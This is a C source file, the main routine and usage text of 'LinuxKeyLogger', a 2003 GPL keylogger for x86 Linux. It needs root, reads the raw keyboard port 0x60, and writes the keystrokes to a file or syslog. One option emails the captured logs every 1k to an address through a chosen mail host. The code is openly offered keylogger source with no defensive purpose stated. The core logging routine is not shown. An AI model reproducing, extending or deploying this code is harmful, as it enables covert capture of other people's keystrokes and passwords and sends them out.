/*
    LinuxKeyLogger, lkl is a keylogger for x86-arch running under linux.
    Developed by vl4d

    Copyright (C) 2003  Carlo Comin

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "lkl.h"

int main(int argc, char *argv[])
{
	char opt;
	extern char *optarg;
	struct lkl lkl;
	memset(&lkl, 0, sizeof(lkl));
	lkl.port = KEYBOARD_PORT;
  
	if(getuid() || getgid()){
		printf("Have to be root to perform a iopl()!\n");
		exit(1);
	}
	if(argc == 1){
		usage();
		exit(1);
	}

	while((opt = getopt(argc, argv, "o:k:m:t:shlb")) != -1)
		switch(opt){
			case 'l':			//start logging-procedure
				lkl.log = 1;
				break;
			case 'o':			//output file for logged datas 
				lkl.outfile = optarg;
				break;
			case 'k':			//define keymap
				lkl.km_file = optarg;
				break;
			case 'b':			//debug output
				lkl.debug = 1;
				break;
			case 'm':			//send logged datas via e-mail
				lkl.mail = 1;
				lkl.mailargs = optarg;
				lkl.host = "127.0.0.1";
				break;
			case 't':			//sendmail's hostname. def is localhost
				lkl.host = optarg;	
				break;
			case 's':
				lkl.syslog = 1;
		                openlog("lkl", LOG_PID, LOG_USER);
				break;
			case 'h':			//print help page
				usage();
				exit(0);
			default:
				usage();
				exit(1);
	}

	if(lkl.log){
		printf("\nStarted to log port 0x%02x. Keymap is %s. The logfile is %s.\n", lkl.port, lkl.km_file, lkl.outfile);
		def_keymap(lkl.km_file);
		start_log(&lkl);
	}

	return 0;
}

void usage()
{
	printf("%s", BOLD);
	printf("\n-- Linux Key Logger vers 0.1.1 --\n");
	printf("\tusage:\n");
	printf("\t\t-h this help\n");
	printf("\t\t-l start to log the 0x60 port (keyboard)\n");
	printf("\t\t-b Debug Mode.Perhaps it's usefoul :P\n");
	printf("\t\t-k <km_file> set a keymap file\n");
	printf("\t\t-o <o_file> set an output file\n");
	printf("\t\t-m <email> send logs to <email> every 1k\n");
	printf("\t\t-t <host> hostname for sendmail server. default is localhost\n");
	printf("\nExample: lkl -l -k keymaps/it_km -o log.file\n\n");
	printf("%s", NORMAL);
}
